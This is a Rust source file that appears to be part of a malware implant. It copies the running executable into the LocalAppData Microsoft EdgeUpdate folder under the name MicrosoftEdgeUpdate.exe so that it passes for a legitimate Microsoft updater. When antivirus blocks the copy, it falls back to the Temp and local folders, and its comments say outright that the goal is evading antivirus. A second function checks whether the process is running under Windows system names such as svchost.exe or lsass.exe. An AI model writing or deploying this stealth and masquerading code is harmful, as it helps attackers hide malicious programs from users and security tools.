use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use rand::Rng;
use anyhow::{Result, Context};

pub fn generate_random_system_name() -> String {
    // We use MicrosoftEdgeUpdate.exe because it is expected to run from AppData
    "MicrosoftEdgeUpdate.exe".to_string()
}

/// Copies the current executable to a temporary location with a system-like name.
/// Returns the path to the new executable.
pub fn prepare_stealth_copy() -> Result<PathBuf> {
    let current_exe = env::current_exe().context("Failed to get current exe path")?;
    
    // Use LocalAppData where EdgeUpdate LEGITIMATELY runs
    // Target: %LOCALAPPDATA%\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
    let local_app_data = env::var("LOCALAPPDATA").unwrap_or(String::from("C:\\Users\\Public"));
    let target_dir = Path::new(&local_app_data)
        .join("Microsoft")
        .join("EdgeUpdate");

    let mut final_target_dir = target_dir.clone();

    if !target_dir.exists() {
        if let Err(e) = fs::create_dir_all(&target_dir) {
            crate::log_error!("Failed to create AppData dir: {}. Falling back to Local.", e);
            // Fallback to local dir if even AppData fails
            final_target_dir = current_exe.parent().unwrap().to_path_buf();
        }
    }

    let new_name = generate_random_system_name();
    let new_path = final_target_dir.join(new_name);

    // If it already exists, overwrite.
    if let Err(e) = fs::copy(&current_exe, &new_path) {
        crate::log_error!("Failed to copy to {:?}: {}. AV might be blocking.", new_path, e);
        
        // Fallback 1: Temp
        let temp_path = env::temp_dir().join(generate_random_system_name());
        if let Err(e_temp) = fs::copy(&current_exe, &temp_path) {
             crate::log_error!("Failed to copy to Temp {:?}: {}. AV blocking there too.", temp_path, e_temp);
             
             // Fallback 2: Local Directory (Whitelisted)
             // We copy it to "RuntimeBroker.exe" in the current dir
             let local_path = current_exe.parent().unwrap().join(generate_random_system_name());
             crate::log_info!("Falling back to Local Directory (Whitelisted): {:?}", local_path);
             fs::copy(&current_exe, &local_path).context("Failed to copy to local fallback")?;
             return Ok(local_path);
        }
        return Ok(temp_path);
    }

    Ok(new_path)
}

/// Checks if the current process name is one of the "stealthy" system names.
pub fn is_stealth_name() -> bool {
    if let Ok(exe_path) = env::current_exe() {
        if let Some(file_name) = exe_path.file_name() {
            let name = file_name.to_string_lossy();
            let system_names = [
                "svchost.exe", "dwm.exe", "RuntimeBroker.exe", "sihost.exe", 
                "taskhostw.exe", "explorer.exe", "csrss.exe", "lsass.exe", 
                "winlogon.exe", "services.exe"
            ];
            return system_names.contains(&name.as_ref());
        }
    }
    false
}
